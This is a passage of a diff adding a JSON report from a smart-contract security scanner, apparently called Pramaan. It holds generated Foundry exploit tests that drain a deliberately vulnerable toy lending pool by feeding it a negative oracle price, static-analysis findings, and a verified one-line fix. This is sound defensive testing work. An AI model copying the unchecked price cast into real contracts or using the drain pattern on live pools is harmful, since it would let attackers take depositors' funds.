+            "source": "// SPDX-License-Identifier: UNLICENSED\n// Generated by Pramaan for finding PRM-5: template oracle-unchecked-price@1, slots filled by heuristics.\n// Hypothesis: OracleLoan.borrow(uint256) uses the price feed's answer without checking that it is positive, so a non-positive answer (cast to uint256) becomes an enormous price.\n// Property under test: A feed that returns a non-positive answer must not let an account holding 1 wei of collateral take ETH that other users deposited.\n// Passing on the vulnerable code reproduces the bug. On fixed code this test must fail (revert or property assertion).\npragma solidity >=0.8.0 <0.9.0;\n\nimport {Test} from \"lib/pramaan-forge-std/src/Test.sol\";\nimport {OracleLoanFixed as PramaanTarget} from \"src/OracleLoanFixed.sol\";\n\n/// Chainlink-style price feed whose answer the test controls. It models a FEED FAILURE (invalid round, circuit-breaker\n/// value, compromised aggregator); it is not something the attacker could do on a healthy feed.\ncontract PramaanMockFeed {\n    uint8 public constant decimals = 8;\n    int256 public answer;\n    uint256 public updatedAt;\n\n    constructor(int256 initialAnswer) {\n        answer = initialAnswer;\n        updatedAt = block.timestamp;\n    }\n\n    function set(int256 newAnswer) external {\n        answer = newAnswer;\n        updatedAt = block.timestamp;\n    }\n\n    function latestAnswer() external view returns (int256) {\n        return answer;\n    }\n\n    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80) {\n        return (1, answer, updatedAt, updatedAt, 1);\n    }\n}\n\ncontract PramaanExploit_PRM_5_OracleLoanFixed is Test {\n    PramaanTarget internal target;\n    PramaanMockFeed internal feed;\n    address internal owner = makeAddr(\"pramaan.owner\");\n    address internal victim = makeAddr(\"pramaan.victim\");\n    address internal attacker = makeAddr(\"pramaan.attacker\");\n    uint256 internal constant SEED = 10 ether;\n    uint256 internal constant ATTACK = 1 ether;\n\n    function setUp() public {\n        feed = new PramaanMockFeed(2000e8);\n        vm.startPrank(owner);\n        bytes memory pramaanInit = abi.encodePacked(type(PramaanTarget).creationCode, abi.encode(address(feed)));\n        address pramaanDeployed;\n        assembly { pramaanDeployed := create(0, add(pramaanInit, 0x20), mload(pramaanInit)) }\n        require(pramaanDeployed != address(0), \"Pramaan: deployment failed\");\n        target = PramaanTarget(payable(pramaanDeployed));\n        vm.stopPrank();\n        vm.deal(victim, SEED);\n        vm.prank(victim);\n        target.deposit{value: SEED}();\n    }\n\n    function test_exploit() public {\n        vm.deal(attacker, ATTACK);\n        vm.prank(attacker);\n        target.deposit{value: 1}();\n        vm.prank(attacker);\n        feed.set(-1);\n        uint256 attackerBefore = attacker.balance;\n        vm.prank(attacker);\n        target.borrow(SEED);\n        uint256 gained = attacker.balance - attackerBefore;\n        emit log_named_uint(\"pramaan.attacker_gain\", gained);\n        assertGe(gained, SEED, \"Pramaan: a non-positive oracle answer let an account with 1 wei of collateral take ETH other users deposited\");\n    }\n}\n",
+            "sha256": "b02fbb476e4fd2a334ab09eaf3e0dcbf4170212238d904ece746f6a369f496cd"
+          },
+          "outcome": {
+            "kind": "reverted",
+            "reason": "invalid oracle answer"
+          },
+          "verified": true
+        }
+      ]
+    },
+    {
+      "id": "PRM-6",
+      "candidate": {
+        "key": "unused-return:OracleLoan:_price()",
+        "vulnClass": "unused-return",
+        "title": "unused-return",
+        "severity": "medium",
+        "confidence": "medium",
+        "contract": "OracleLoan",
+        "function": "_price()",
+        "file": "src/OracleLoan.sol",
+        "lines": [
+          54,
+          55,
+          56,
+          57
+        ],
+        "sources": [
+          {
+            "tool": "slither",
+            "detector": "unused-return",
+            "description": "OracleLoan._price() (src/OracleLoan.sol#54-57) ignores return value by (None,answer,None,None,None) = feed.latestRoundData() (src/OracleLoan.sol#55)"
+          }
+        ]
+      },
+      "templateId": null,
+      "plan": null,
+      "planError": "no exploit template for class \"unused-return\"",
+      "test": null,
+      "gates": [],
+      "vulnerableRun": {
+        "result": "not-run",
+        "reason": null,
+        "logs": [],
+        "durationMs": null
+      },
+      "status": "candidate",
+      "pairs": []
+    },
+    {
+      "id": "PRM-7",
+      "candidate": {
+        "key": "unused-return:OracleLoanFixed:_price()",
+        "vulnClass": "unused-return",
+        "title": "unused-return",
+        "severity": "medium",
+        "confidence": "medium",
+        "contract": "OracleLoanFixed",
+        "function": "_price()",
+        "file": "src/OracleLoanFixed.sol",
+        "lines": [
+          50,
+          51,
+          52,
+          53,
+          54,
+          55
+        ],
+        "sources": [
+          {
+            "tool": "slither",
+            "detector": "unused-return",
+            "description": "OracleLoanFixed._price() (src/OracleLoanFixed.sol#50-55) ignores return value by (None,answer,None,updatedAt,None) = feed.latestRoundData() (src/OracleLoanFixed.sol#51)"
+          }
+        ]
+      },
+      "templateId": null,
+      "plan": null,
+      "planError": "no exploit template for class \"unused-return\"",
+      "test": null,
+      "gates": [],
+      "vulnerableRun": {
+        "result": "not-run",
+        "reason": null,
+        "logs": [],
+        "durationMs": null
+      },
+      "status": "candidate",
+      "pairs": []
+    },
+    {
+      "id": "PRM-8",
+      "candidate": {
+        "key": "push-zero-opcode:src/IPriceFeed.sol:L2",
+        "vulnClass": "push-zero-opcode",
+        "title": "PUSH0 Opcode",
+        "severity": "low",
+        "confidence": "medium",
+        "contract": "src/IPriceFeed.sol",
+        "function": null,
+        "file": "src/IPriceFeed.sol",
+        "lines": [
+          2
+        ],
+        "sources": [
+          {
+            "tool": "aderyn",
+            "detector": "push-zero-opcode",
+            "description": "PUSH0 Opcode"
+          }
+        ]
+      },
+      "templateId": null,
+      "plan": null,
+      "planError": "contract src/IPriceFeed.sol not found in build output",
+      "test": null,
+      "gates": [],
+      "vulnerableRun": {
+        "result": "not-run",
+        "reason": null,
+        "logs": [],
+        "durationMs": null
+      },
+      "status": "candidate",
+      "pairs": []
+    },
+    {
+      "id": "PRM-9",
+      "candidate": {
+        "key": "push-zero-opcode:src/OracleLoan.sol:L2",
+        "vulnClass": "push-zero-opcode",
+        "title": "PUSH0 Opcode",
+        "severity": "low",
+        "confidence": "medium",
+        "contract": "src/OracleLoan.sol",
+        "function": null,
+        "file": "src/OracleLoan.sol",
+        "lines": [
+          2
+        ],
+        "sources": [
+          {
+            "tool": "aderyn",
+            "detector": "push-zero-opcode",
+            "description": "PUSH0 Opcode"
+          }
+        ]
+      },
+      "templateId": null,
+      "plan": null,
+      "planError": "contract src/OracleLoan.sol not found in build output",
+      "test": null,
+      "gates": [],
+      "vulnerableRun": {
+        "result": "not-run",
+        "reason": null,
+        "logs": [],
+        "durationMs": null
+      },
+      "status": "candidate",
+      "pairs": []
+    },
+    {
+      "id": "PRM-10",
+      "candidate": {
+        "key": "push-zero-opcode:src/OracleLoanFixed.sol:L2",
+        "vulnClass": "push-zero-opcode",
+        "title": "PUSH0 Opcode",
+        "severity": "low",
+        "confidence": "medium",
+        "contract": "src/OracleLoanFixed.sol",
+        "function": null,
+        "file": "src/OracleLoanFixed.sol",
+        "lines": [
+          2
+        ],
+        "sources": [
+          {
+            "tool": "aderyn",
+            "detector": "push-zero-opcode",
+            "description": "PUSH0 Opcode"
+          }
+        ]
+      },
+      "templateId": null,
+      "plan": null,
+      "planError": "contract src/OracleLoanFixed.sol not found in build output",
+      "test": null,
+      "gates": [],
+      "vulnerableRun": {
+        "result": "not-run",
+        "reason": null,
+        "logs": [],
+        "durationMs": null
+      },
+      "status": "candidate",
+      "pairs": []
+    },
+    {
+      "id": "PRM-11",
+      "candidate": {
+        "key": "reentrancy-events:OracleLoan:borrow(uint256)",
+        "vulnClass": "reentrancy-events",
+        "title": "reentrancy-events",
+        "severity": "low",
+        "confidence": "medium",
+        "contract": "OracleLoan",
+        "function": "borrow(uint256)",
+        "file": "src/OracleLoan.sol",
+        "lines": [
+          33,
+          34,
+          35,
+          36,
+          37,
+          38,
+          39,
+          40,
+          41
+        ],
+        "sources": [
+          {
+            "tool": "slither",
+            "detector": "reentrancy-events",
+            "description": "Reentrancy in OracleLoan.borrow(uint256) (src/OracleLoan.sol#33-41):\n\tExternal calls:\n\t- (ok,None) = msg.sender.call{value: amount}() (src/OracleLoan.sol#38)\n\tEvent emitted after the call(s):\n\t- Borrowed(msg.sender,amount) (src/OracleLoan.sol#40)"
+          }
+        ]
+      },
+      "templateId": null,
+      "plan": null,
+      "planError": "no exploit template for class \"reentrancy-events\"",
+      "test": null,
+      "gates": [],
+      "vulnerableRun": {
+        "result": "not-run",
+        "reason": null,
+        "logs": [],
+        "durationMs": null
+      },
+      "status": "candidate",
+      "pairs": []
+    },
+    {
+      "id": "PRM-12",
+      "candidate": {
+        "key": "reentrancy-events:OracleLoan:repay()",
+        "vulnClass": "reentrancy-events",
+        "title": "reentrancy-events",
+        "severity": "low",
+        "confidence": "medium",
+        "contract": "OracleLoan",
+        "function": "repay()",
+        "file": "src/OracleLoan.sol",
+        "lines": [
+          43,
+          44,
+          45,
+          46,
+          47,
+          48,
+          49,
+          50,
+          51,
+          52
+        ],
+        "sources": [
+          {
+            "tool": "slither",
+            "detector": "reentrancy-events",
+            "description": "Reentrancy in OracleLoan.repay() (src/OracleLoan.sol#43-52):\n\tExternal calls:\n\t- (ok,None) = msg.sender.call{value: msg.value - paid}() (src/OracleLoan.sol#48)\n\tEvent emitted after the call(s):\n\t- Repaid(msg.sender,paid) (src/OracleLoan.sol#51)"
+          }
+        ]
+      },
+      "templateId": null,
+      "plan": null,
+      "planError": "no exploit template for class \"reentrancy-events\"",
+      "test": null,
+      "gates": [],
+      "vulnerableRun": {
+        "result": "not-run",
+        "reason": null,
+        "logs": [],
+        "durationMs": null
+      },
+      "status": "candidate",
+      "pairs": []
+    },
+    {
+      "id": "PRM-13",
+      "candidate": {
+        "key": "reentrancy-events:OracleLoanFixed:borrow(uint256)",
+        "vulnClass": "reentrancy-events",
+        "title": "reentrancy-events",
+        "severity": "low",
+        "confidence": "medium",
+        "contract": "OracleLoanFixed",
+        "function": "borrow(uint256)",
+        "file": "src/OracleLoanFixed.sol",
+        "lines": [
+          29,
+          30,
+          31,
+          32,
+          33,
+          34,
+          35,
+          36,
+          37
+        ],
+        "sources": [
+          {
+            "tool": "slither",
+            "detector": "reentrancy-events",
+            "description": "Reentrancy in OracleLoanFixed.borrow(uint256) (src/OracleLoanFixed.sol#29-37):\n\tExternal calls:\n\t- (ok,None) = msg.sender.call{value: amount}() (src/OracleLoanFixed.sol#34)\n\tEvent emitted after the call(s):\n\t- Borrowed(msg.sender,amount) (src/OracleLoanFixed.sol#36)"
+          }
+        ]
+      },
+      "templateId": null,
+      "plan": null,
+      "planError": "no exploit template for class \"reentrancy-events\"",
+      "test": null,
+      "gates": [],
+      "vulnerableRun": {
+        "result": "not-run",
+        "reason": null,
+        "logs": [],
+        "durationMs": null
+      },
+      "status": "candidate",
+      "pairs": []
+    },
+    {
+      "id": "PRM-14",
+      "candidate": {
+        "key": "reentrancy-events:OracleLoanFixed:repay()",
+        "vulnClass": "reentrancy-events",
+        "title": "reentrancy-events",
+        "severity": "low",
+        "confidence": "medium",
+        "contract": "OracleLoanFixed",
+        "function": "repay()",
+        "file": "src/OracleLoanFixed.sol",
+        "lines": [
+          39,
+          40,
+          41,
+          42,
+          43,
+          44,
+          45,
+          46,
+          47,
+          48
+        ],
+        "sources": [
+          {
+            "tool": "slither",
+            "detector": "reentrancy-events",
+            "description": "Reentrancy in OracleLoanFixed.repay() (src/OracleLoanFixed.sol#39-48):\n\tExternal calls:\n\t- (ok,None) = msg.sender.call{value: msg.value - paid}() (src/OracleLoanFixed.sol#44)\n\tEvent emitted after the call(s):\n\t- Repaid(msg.sender,paid) (src/OracleLoanFixed.sol#47)"
+          }
+        ]
+      },
+      "templateId": null,
+      "plan": null,
+      "planError": "no exploit template for class \"reentrancy-events\"",
+      "test": null,
+      "gates": [],
+      "vulnerableRun": {
+        "result": "not-run",
+        "reason": null,
+        "logs": [],
+        "durationMs": null
+      },
+      "status": "candidate",
+      "pairs": []
+    },
+    {
+      "id": "PRM-15",
+      "candidate": {
+        "key": "timestamp:OracleLoanFixed:_price()",
+        "vulnClass": "timestamp",
+        "title": "timestamp",
+        "severity": "low",
+        "confidence": "medium",
+        "contract": "OracleLoanFixed",
+        "function": "_price()",
+        "file": "src/OracleLoanFixed.sol",
+        "lines": [
+          50,
+          51,
+          52,
+          53,
+          54,
+          55
+        ],
+        "sources": [
+          {
+            "tool": "slither",
+            "detector": "timestamp",
+            "description": "OracleLoanFixed._price() (src/OracleLoanFixed.sol#50-55) uses timestamp for comparisons\n\tDangerous comparisons:\n\t- require(bool,string)(block.timestamp - updatedAt <= MAX_AGE,stale oracle answer) (src/OracleLoanFixed.sol#53)"
+          }
+        ]
+      },
+      "templateId": null,
+      "plan": null,
+      "planError": "no exploit template for class \"timestamp\"",
+      "test": null,
+      "gates": [],
+      "vulnerableRun": {
+        "result": "not-run",
+        "reason": null,
+        "logs": [],
+        "durationMs": null
+      },
+      "status": "candidate",
+      "pairs": []
+    },
+    {
+      "id": "PRM-16",
+      "candidate": {
+        "key": "unspecific-solidity-pragma:src/IPriceFeed.sol:L2",
+        "vulnClass": "unspecific-solidity-pragma",
+        "title": "Unspecific Solidity Pragma",
+        "severity": "low",
+        "confidence": "medium",
+        "contract": "src/IPriceFeed.sol",
+        "function": null,
+        "file": "src/IPriceFeed.sol",
+        "lines": [
+          2
+        ],
+        "sources": [
+          {
+            "tool": "aderyn",
+            "detector": "unspecific-solidity-pragma",
+            "description": "Unspecific Solidity Pragma"
+          }
+        ]
+      },
+      "templateId": null,
+      "plan": null,
+      "planError": "contract src/IPriceFeed.sol not found in build output",
+      "test": null,
+      "gates": [],
+      "vulnerableRun": {
+        "result": "not-run",
+        "reason": null,
+        "logs": [],
+        "durationMs": null
+      },
+      "status": "candidate",
+      "pairs": []
+    },
+    {
+      "id": "PRM-17",
+      "candidate": {
+        "key": "unspecific-solidity-pragma:src/OracleLoan.sol:L2",
+        "vulnClass": "unspecific-solidity-pragma",
+        "title": "Unspecific Solidity Pragma",
+        "severity": "low",
+        "confidence": "medium",
+        "contract": "src/OracleLoan.sol",
+        "function": null,
+        "file": "src/OracleLoan.sol",
+        "lines": [
+          2
+        ],
+        "sources": [
+          {
+            "tool": "aderyn",
+            "detector": "unspecific-solidity-pragma",
+            "description": "Unspecific Solidity Pragma"
+          }
+        ]
+      },
+      "templateId": null,
+      "plan": null,
+      "planError": "contract src/OracleLoan.sol not found in build output",
+      "test": null,
+      "gates": [],
+      "vulnerableRun": {
+        "result": "not-run",
+        "reason": null,
+        "logs": [],
+        "durationMs": null
+      },
+      "status": "candidate",
+      "pairs": []
+    },
+    {
+      "id": "PRM-18",
+      "candidate": {
+        "key": "unspecific-solidity-pragma:src/OracleLoanFixed.sol:L2",
+        "vulnClass": "unspecific-solidity-pragma",
+        "title": "Unspecific Solidity Pragma",
+        "severity": "low",
+        "confidence": "medium",
+        "contract": "src/OracleLoanFixed.sol",
+        "function": null,
+        "file": "src/OracleLoanFixed.sol",
+        "lines": [
+          2
+        ],
+        "sources": [
+          {
+            "tool": "aderyn",
+            "detector": "unspecific-solidity-pragma",
+            "description": "Unspecific Solidity Pragma"
+          }
+        ]
+      },
+      "templateId": null,
+      "plan": null,
+      "planError": "contract src/OracleLoanFixed.sol not found in build output",
+      "test": null,
+      "gates": [],
+      "vulnerableRun": {
+        "result": "not-run",
+        "reason": null,
+        "logs": [],
+        "durationMs": null
+      },
+      "status": "candidate",
+      "pairs": []
+    }
+  ],
+  "regression": {
+    "ran": true,
+    "passed": 3,
+    "failed": 0,
+    "skipped": 0,
+    "failures": []
+  },
+  "sandbox": {
+    "image": "pramaan/sandbox:0.1.0",
+    "analyzeMs": 6013,
+    "testMs": 4796
+  },
+  "fixes": {
+    "PRM-5": {
+      "fix": {
+        "generator": "deterministic",
+        "file": "src/OracleLoan.sol",
+        "before": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {IPriceFeed} from \"./IPriceFeed.sol\";\n\n/// @notice DELIBERATELY VULNERABLE example (never deploy with real funds). A toy ETH lending pool whose borrowing power\n///         scales with an oracle price relative to a reference price. `_price()` converts the feed's signed answer to\n///         `uint256` without checking it: when the feed reports a non-positive answer (an invalid round) the cast\n///         yields an enormous price and a borrower with 1 wei of collateral can borrow the whole pool. Used to\n///         exercise Pramaan's oracle template.\ncontract OracleLoan {\n    /// @dev Price (8 decimals) at which 1 wei of collateral supports exactly 1 wei of debt.\n    uint256 public constant REFERENCE_PRICE = 2000e8;\n\n    IPriceFeed public immutable feed;\n    mapping(address account => uint256) public collateral;\n    mapping(address account => uint256) public debt;\n\n    event Deposited(address indexed account, uint256 amount);\n    event Borrowed(address indexed account, uint256 amount);\n    event Repaid(address indexed account, uint256 amount);\n\n    constructor(IPriceFeed feed_) {\n        feed = feed_;\n    }\n\n    function deposit() external payable {\n        require(msg.value > 0, \"zero deposit\");\n        collateral[msg.sender] += msg.value;\n        emit Deposited(msg.sender, msg.value);\n    }\n\n    function borrow(uint256 amount) external {\n        uint256 limit = (collateral[msg.sender] * _price()) / REFERENCE_PRICE;\n        require(debt[msg.sender] + amount <= limit, \"over the borrow limit\");\n        require(amount <= address(this).balance, \"pool is short of ETH\");\n        debt[msg.sender] += amount;\n        (bool ok,) = msg.sender.call{value: amount}(\"\");\n        require(ok, \"transfer failed\");\n        emit Borrowed(msg.sender, amount);\n    }\n\n    function repay() external payable {\n        uint256 owed = debt[msg.sender];\n        uint256 paid = msg.value > owed ? owed : msg.value;\n        debt[msg.sender] = owed - paid;\n        if (msg.value > paid) {\n            (bool ok,) = msg.sender.call{value: msg.value - paid}(\"\");\n            require(ok, \"refund failed\");\n        }\n        emit Repaid(msg.sender, paid);\n    }\n\n    function _price() internal view returns (uint256) {\n        (, int256 answer,,,) = feed.latestRoundData();\n        return uint256(answer);\n    }\n}\n",
+        "after": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport {IPriceFeed} from \"./IPriceFeed.sol\";\n\n/// @notice DELIBERATELY VULNERABLE example (never deploy with real funds). A toy ETH lending pool whose borrowing power\n///         scales with an oracle price relative to a reference price. `_price()` converts the feed's signed answer to\n///         `uint256` without checking it: when the feed reports a non-positive answer (an invalid round) the cast\n///         yields an enormous price and a borrower with 1 wei of collateral can borrow the whole pool. Used to\n///         exercise Pramaan's oracle template.\ncontract OracleLoan {\n    /// @dev Price (8 decimals) at which 1 wei of collateral supports exactly 1 wei of debt.\n    uint256 public constant REFERENCE_PRICE = 2000e8;\n\n    IPriceFeed public immutable feed;\n    mapping(address account => uint256) public collateral;\n    mapping(address account => uint256) public debt;\n\n    event Deposited(address indexed account, uint256 amount);\n    event Borrowed(address indexed account, uint256 amount);\n    event Repaid(address indexed account, uint256 amount);\n\n    constructor(IPriceFeed feed_) {\n        feed = feed_;\n    }\n\n    function deposit() external payable {\n        require(msg.value > 0, \"zero deposit\");\n        collateral[msg.sender] += msg.value;\n        emit Deposited(msg.sender, msg.value);\n    }\n\n    function borrow(uint256 amount) external {\n        uint256 limit = (collateral[msg.sender] * _price()) / REFERENCE_PRICE;\n        require(debt[msg.sender] + amount <= limit, \"over the borrow limit\");\n        require(amount <= address(this).balance, \"pool is short of ETH\");\n        debt[msg.sender] += amount;\n        (bool ok,) = msg.sender.call{value: amount}(\"\");\n        require(ok, \"transfer failed\");\n        emit Borrowed(msg.sender, amount);\n    }\n\n    function repay() external payable {\n        uint256 owed = debt[msg.sender];\n        uint256 paid = msg.value > owed ? owed : msg.value;\n        debt[msg.sender] = owed - paid;\n        if (msg.value > paid) {\n            (bool ok,) = msg.sender.call{value: msg.value - paid}(\"\");\n            require(ok, \"refund failed\");\n        }\n        emit Repaid(msg.sender, paid);\n    }\n\n    function _price() internal view returns (uint256) {\n        (, int256 answer,,,) = feed.latestRoundData();\n        require(answer > 0, \"Pramaan: oracle answer is not positive\");\n        return uint256(answer);\n    }\n}\n",
+        "diff": "===================================================================\n--- a/src/OracleLoan.sol\n+++ b/src/OracleLoan.sol\n@@ -53,6 +53,7 @@\n \n     function _price() internal view returns (uint256) {\n         (, int256 answer,,,) = feed.latestRoundData();\n+        require(answer > 0, \"Pramaan: oracle answer is not positive\");\n         return uint256(answer);\n     }\n }\n",
+        "explanation": "OracleLoan.borrow() reads the price feed and uses the answer as an unsigned price without checking it. A non-positive answer (an invalid round) is cast to an enormous uint256, which makes any account look massively over-collateralised. The patch rejects non-positive answers.",
+        "change": "require a positive oracle answer in OracleLoan"
+      },
+      "verification": {
+        "verified": true,
+        "exploit": {
+          "kind": "assertion-failed",
+          "reason": "Pramaan: oracle answer is not positive"
+        },
+        "regression": {
+          "ran": true,
+          "passed": 3,
+          "failed": 0,
+          "skipped": 0,
+          "failures": []
+        },
+        "test": {
+          "fileName": "PramaanExploit_PRM_5.t.sol",
+          "contractName": "PramaanExploit_PRM_5",
+          "source": "// SPDX-License-Identifier: UNLICENSED\n// Generated by Pramaan for finding PRM-5: template oracle-unchecked-price@1, slots filled by heuristics.\n// Hypothesis: OracleLoan.borrow(uint256) uses the price feed's answer without checking that it is positive, so a non-positive answer (cast to uint256) becomes an enormous price.\n// Property under test: A feed that returns a non-positive answer must not let an account holding 1 wei of collateral take ETH that other users deposited.\n// Passing on the vulnerable code reproduces the bug. On fixed code this test must fail (revert or property assertion).\npragma solidity >=0.8.0 <0.9.0;\n\nimport {Test} from \"lib/pramaan-forge-std/src/Test.sol\";\nimport {OracleLoan as PramaanTarget} from \"src/OracleLoan.sol\";\n\n/// Chainlink-style price feed whose answer the test controls. It models a FEED FAILURE (invalid round, circuit-breaker\n/// value, compromised aggregator); it is not something the attacker could do on a healthy feed.\ncontract PramaanMockFeed {\n    uint8 public constant decimals = 8;\n    int256 public answer;\n    uint256 public updatedAt;\n\n    constructor(int256 initialAnswer) {\n        answer = initialAnswer;\n        updatedAt = block.timestamp;\n    }\n\n    function set(int256 newAnswer) external {\n        answer = newAnswer;\n        updatedAt = block.timestamp;\n    }\n\n    function latestAnswer() external view returns (int256) {\n        return answer;\n    }\n\n    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80) {\n        return (1, answer, updatedAt, updatedAt, 1);\n    }\n}\n\ncontract PramaanExploit_PRM_5 is Test {\n    PramaanTarget internal target;\n    PramaanMockFeed internal feed;\n    address internal owner = makeAddr(\"pramaan.owner\");\n    address internal victim = makeAddr(\"pramaan.victim\");\n    address internal attacker = makeAddr(\"pramaan.attacker\");\n    uint256 internal constant SEED = 10 ether;\n    uint256 internal constant ATTACK = 1 ether;\n\n    function setUp() public {\n        feed = new PramaanMockFeed(2000e8);\n        vm.startPrank(owner);\n        bytes memory pramaanInit = abi.encodePacked(type(PramaanTarget).creationCode, abi.encode(address(feed)));\n        address pramaanDeployed;\n        assembly { pramaanDeployed := create(0, add(pramaanInit, 0x20), mload(pramaanInit)) }\n        require(pramaanDeployed != address(0), \"Pramaan: deployment failed\");\n        target = PramaanTarget(payable(pramaanDeployed));\n        vm.stopPrank();\n        vm.deal(victim, SEED);\n        vm.prank(victim);\n        target.deposit{value: SEED}();\n    }\n\n    function test_exploit() public {\n        vm.deal(attacker, ATTACK);\n        vm.prank(attacker);\n        target.deposit{value: 1}();\n        vm.prank(attacker);\n        feed.set(-1);\n        uint256 attackerBefore = attacker.balance;\n        vm.prank(attacker);\n        target.borrow(SEED);\n        uint256 gained = attacker.balance - attackerBefore;\n        emit log_named_uint(\"pramaan.attacker_gain\", gained);\n        assertGe(gained, SEED, \"Pramaan: a non-positive oracle answer let an account with 1 wei of collateral take ETH other users deposited\");\n    }\n}\n",
+          "sha256": "2ba9423dae4b1236a777e1175d7ea363bac8e03a86b1845ada9bd9dac17d2cb2"
+        },
+        "detail": "exploit blocked (assertion-failed: Pramaan: oracle answer is not positive); 3 regression tests pass",
+        "durationMs": 6841
+      }
+    }
+  }
+}
